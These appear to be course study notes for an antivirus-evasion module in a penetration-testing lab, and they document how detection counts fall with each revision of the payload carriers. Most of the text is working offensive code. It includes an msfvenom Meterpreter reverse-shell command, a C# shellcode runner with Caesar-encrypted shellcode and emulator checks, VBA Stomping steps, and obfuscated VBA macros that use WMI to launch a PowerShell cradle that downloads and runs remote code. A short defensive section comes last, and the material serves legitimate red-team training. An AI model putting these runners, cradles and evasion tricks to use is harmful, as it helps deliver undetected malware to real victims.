PEN-300 Module 10 — Introduction to Antivirus Evasion (signature & heuristic bypasses)

Fuente: material del curso correspondiente (sin video público)

Objective

Build a working methodology for evading antivirus products on a client-side engagement: understand how AV classifies malware (signature-based vs. heuristic/emulated detection, on-demand vs. real-time scanning), then iteratively reduce detection counts for three payload carriers used throughout the rest of the course:

  1. A custom C# shellcode runner (replaces msfvenom-generated executables).
  2. Microsoft Office documents with VBA shellcode runners (plus VBA Stomping).
  3. VBA + PowerShell download cradles (de-chained via WMI, fully obfuscated).

The measure of progress throughout the module is the AntiScan.Me multi-engine result — the lab's ground truth for how many of 26 engines flag each revision (Avira real-time on the victim is checked separately with on-demand scans).

Target surface

  • Windows 10 development machine — Visual Studio (C# Console App projects), FlexHEX, C:\Tools\EvilClippy.exe.
  • Windows 10 victim machine — Avira installed with real-time protection; used for on-demand scan validation.
  • Kali attack machine — msfvenom for shellcode generation, nc/Metasploit multi/handler for callbacks.
  • Engines exercised: Avira, ClamAV (on-demand) and AntiScan.Me (26 engines, signature + heuristic).
  • Shorthand: OSEP1\offsec / password lab on the lab machines (documented in the course environment, not a discovered credential).

Techniques

0. How AV detects (theory)

  • Signature-based detection — byte patterns (e.g. known shellcode encoders, msfvenom stubs, template code) matched against files. Defeated by changing the bytes: custom code, custom encryption.
  • Heuristic detection — the AV emulates execution in a sandbox and watches behavior (suspicious API sequences, timing, memory allocation). Defeated by changing the behavior: detecting the emulator and exiting early.
  • On-demand vs. real-time — scheduled/manual scans vs. continuous file/monitor interception. The module validates against both.
  • Empirical baseline: msfvenom-generated executables are flagged almost universally (24/26); even benign-format documents carrying a stock Meterpreter stager get flagged by several engines — signatures for public payloads are everywhere.

1. Bypassing signature detection — custom C# shellcode runner — 10.1.1

Generate raw (unencoded) shellcode once:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> \
  -f csharp
# buf = new byte[752] { 0xfc,0x48,0x83,0xe4,... }   <-- full array omitted here

Then stop shipping malware binaries and compile your own runner — no msfvenom exe template, no encoder stub. Classic Win32 triad via P/Invoke:

[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

// VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000 /*MEM_COMMIT|RESERVE*/, 0x40 /*RWX*/);
// Marshal.Copy(buf, 0, addr, buf.Length); CreateThread(...); WaitForSingleObject(h, 0xFFFFFFFF);

Result: Avira and ClamAV clean (custom binary beats both on-demand engines) but AntiScan.Me still flags 11/26 — heuristic engines are unimpressed by RWX + CreateThread.

2. Bypassing signature detection — custom encryption — 10.1.2

msfvenom encoders are signatured and AES is impractical to implement by hand, so the course uses a Caesar cipher (add a constant to every byte; trivial to implement without external libraries, and enough to destroy static signatures).

Encrypt in a throwaway helper project, print in msfvenom format:

// key = 2
for(int i = 0; i < buf.Length; i++)
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);   // & 0xFF keeps it in 0-255

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
    hex.AppendFormat("0x{0:x2}, ", b);                // "0x{0:x2} " → msfvenom-look output
Console.WriteLine("The payload is: " + hex.ToString());

Decrypt in the runner before VirtualAlloc:

for(int i = 0; i < buf.Length; i++)
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);

Result: 7/26 (down from 11). Lesson: custom-but-crypto-trivial obfuscation breaks most static signatures; the remaining detections are heuristics.

3. Bypassing heuristics (emulation) — 10.2

Two emulator-detection primitives, both following the same pattern: check for a condition that differs between a real OS and the AV emulator; if emulated, exit before doing anything suspicious.

a) Time-lapse check with Sleep — emulators fast-forward through sleep calls:

[DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

DateTime t1 = DateTime.Now;
Sleep(2000);
double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
if (t2 < 1.5) { return; }   // 1.5s tolerance for measurement inaccuracy

Sleep alone doesn't change the score (11/26 — signatures still dominate); combined with the Caesar-encrypted shellcode the encryption + time-lapse pair pushes the count down further.

b) Non-emulated API: VirtualAllocExNuma — obscure APIs (rarely used, poorly documented) are often simply not implemented in AV emulators, so the call fails under emulation. No pinvoke.net entry exists, but the prototype mirrors VirtualAllocEx with one extra DWORD (nndPreferred = target NUMA node):

[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if (mem == null) { return; }   // emulator can't satisfy it → bail out

Encryption + VirtualAllocExNuma (no Sleep needed): 4/26. Exercise set also suggests FlsAlloc and hunting for further non-emulated APIs.

4. Bypassing AV in VBA — 10.3.1

The staged VBA runner ( Declare PtrSafe VirtualAlloc / RtlMoveMemory / CreateThread, shellcode as a Variant decimal Array(...), AutoOpen → mymacro) scans at 7/26. Attempts:

  • Caesar encryption in VBA — re-encrypt in the C# helper, emit decimal values with a line-continuation every 50 bytes (AppendFormat("{0:D}, ") + if (counter % 50 == 0) hex.AppendFormat("_{0}", Environment.NewLine)); decrypt with For i = 0 To UBound(buf): buf(i) = buf(i) - 2: Next i. No improvement (7/26) — the vector itself is signatured.
  • Sleep time-lapse in VBA — t1 = Now(): Sleep (2000): t2 = Now(): If DateDiff("s", t1, t2) < 2 Then Exit Function. Still 7/26 — confirms the detections are Office-vector signatures, not payload heuristics. Office documents are so heavily abused that vendors have invested heavily in this attack surface specifically.

5. VBA Stomping — 10.3.2

Background on the file formats:

  • .doc/.xls = Compound File Binary Format (CFBF) — a filesystem-in-a-file; inspect with FlexHEX (File → Open → OLE Compound File).
  • .docm/.xlsm = zip-like OOXML; macros live in vbaProject.bin inside the archive.

Key structures inside the Macros folder:

  • PROJECT — contains Module=NewMacros; nulling this ASCII line (Edit → Insert Zero Block) hides the macro from the graphical VBA editor (defeats manual review, not AV scans — the macro still runs).
  • PerformanceCache / P-code — both _VBA_PROJECT and NewMacros carry a compiled, cached version of the VBA, specific to the Office version/edition that produced it (the header records e.g. "Office 16", VBE7.DLL, 32-bit path). If the doc opens on a matching Office install, Word executes the P-code and ignores the textual source entirely; on a mismatch, P-code is ignored and the source is used (→ macro fails if stomped).
  • CompressedSourceCode — the (partially compressed) VBA source inside NewMacros, starting at Attribute VB_Name = "NewMacros".

The stomp: zero out everything from Attribute VB_Name to the end of the file (source only, P-code preserved). Effects:

  1. The VBA editor shows an empty container, yet the macro still executes (reverse shell lands).
  2. Word then decompiles the P-code back into the editor — the source visibly reappears after execution.
  3. AntiScan.Me drops to 4/26 — very few engines inspect P-code at all.

Caveats: version-matching is mandatory (wrong Office version ⇒ no execution at all), and the technique relies on partially undocumented format internals — more evasions may exist. Evil Clippy (C:\Tools\EvilClippy.exe) automates the process.

6. Hiding PowerShell inside VBA — dechaining with WMI — 10.4.1–10.4.2

Baseline: a VBA macro that only launches a PowerShell download cradle —

Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<ip>/run.txt'))"
  Shell strArg, vbHide
End Sub

— scores a surprising 8/26: worse than a document with raw shellcode. Two causes: the Shell method itself (PowerShell becomes a child of WINWORD.EXE — suspicious parent-child chain) and the universally signatured cradle string.

De-chain with WMI — winmgmt runs inside svchost (LocalSystem); WMI launches actions in Wmiprvse.exe, so PowerShell gets a benign parent, and the VBA no longer contains Shell:

Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://<ip>/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

(Create args: command line, two unused creation-info slots, and an out-variable receiving the PID.) Note the spawned PowerShell is 64-bit even from 32-bit Office — the runner script must match. Score unchanged (7/26) — expected, the cradle string is still plaintext — but the structure is now AV-friendly: only ambiguous GetObject/Get/Create calls remain.

7. Obfuscating VBA — 10.4.3

Three signatured strings to hide: the cradle, winmgmts:, and Win32_Process.

Attempt 1 — StrReverse on every string, wrapped in a benignly-named function to minimize how often the (malware-notorious) StrReverse token appears:

Function bears(cows)
    bears = StrReverse(cows)
End Function

strArg = bears("))'txt.nur/<reversed-ip>//:ptth'...")   ' cradle, reversed
GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid

4/26 — a large drop from a trivial trick; but advanced engines may un-reverse strings.

Attempt 2 — decimal + Caesar (key 17) on every string. PowerShell encryptor pads each char to 3 digits ([byte][char]$_ + 17, zero-pad to length 3) and copies to the clipboard:

$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://<ip>/run.txt'))"
[string]$output = ""
$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1) { $thischar = "00" + $thischar; $output += $thischar }
    elseif($thischar.Length -eq 2) { $thischar = "0" + $thischar; $output += $thischar }
    else { $output += $thischar }
}
$output | clip

VBA decryptor — four benignly-named ("food") functions; Left/Right walk the string 3 digits at a time:

Function Pears(Beets)          ' Chr(Beets - 17)        — digit-triplet → char
Function Strawberries(Grapes)  ' Left(Grapes, 3)
Function Almonds(Jelly)        ' Right(Jelly, Len(Jelly) - 3)
Function Nuts(Milk)            ' Do: Oatmilk = Oatmilk + Pears(Strawberries(Milk)):
                               '     Milk = Almonds(Milk): Loop While Len(Milk) > 0

Function MyMacro()
    Dim Apples As String      ' 3-digit decimal blob for the cradle
    Dim Water As String
    Apples = "129128136118131132121..."   ' encrypted cradle (omitted)
    Water = Nuts(Apples)
    GetObject(Nuts("<enc winmgmts:>")).Get(Nuts("<enc Win32_Process>")).Create Water, Tea, Coffee, Napkin
End Function

(Instead of literal Null args, pass undefined variables — VBA treats them as Null/Empty.) → 2/26.

Attempt 3 — document-name heuristic check. AV emulators open the document under a renamed temp copy, so checking the name defeats emulation without any Win32 API:

If ActiveDocument.Name <> Nuts("<encrypted 'runner.doc'>") Then
  Exit Function
End If

Final result: 1/26 — the full stack (WMI de-chaining + full-string encryption + benign names + document-name check) is the module's best document payload.

Extra Mile: modify, encrypt, and obfuscate the C# process-hollowing techniques from module 9 to bypass AV. Exercises also include exploiting Serviio PRO 1.8 (DLNA media server) on the Windows 10 victim for SYSTEM while evading Avira real-time.

Detection & defense

  • Signature detection is nearly dead against custom code. Every detection reduction in the module came from changing bytes we control: compiling our own runner, custom (even trivially weak) encryption, benign identifier names. Defensively, this is why vendor detection counts are a lagging indicator — engines react to samples after the fact.
  • Heuristic/emulated detection is brittle in both directions. Emulators fast-forward Sleep, skip obscure APIs (VirtualAllocExNuma), and rename files under test — every emulator shortcut is an oracle an attacker can read (time-lapse, null returns, ActiveDocument.Name). Vendors must emulate everything or leak detectable divergences.
  • The Office attack surface is signature-heavy by necessity (7-8 flags even for stock runners) — but VBA Stomping shows the parser-level blind spot: few engines execute/inspect P-code, only the textual source. Detection that doesn't decompile P-code misses stomped macros entirely; the version-matching requirement also means stomped docs break on mismatched Office builds, which is itself an observable failure.
  • Parent-child process lineage matters. WINWORD.EXE → powershell.exe was flagged heavily on its own; WINWORD.EXE → WmiPrvSE.exe → powershell.exe was not. EDR-style detection should key on Office spawning script hosts at all, via any intermediary — not on one suspicious chain.
  • No first-stage on disk ≠ undetectable. The download-cradle payloads still rely on fetching and executing remote code; detecting the cradle pattern, the WMI process creation from Office, and the resulting network callbacks are the durable signals, since the document content can be fully encrypted.
  • Behavioral anchors that survive all obfuscation here: RWX private-memory allocation + thread execution (C# runner), Win32_Process.Create from a document context, Office processes spawning powershell.exe, and outbound HTTP from script hosts. The module's payloads evade file scanners; runtime/telemetry-based detection is module 11's topic.
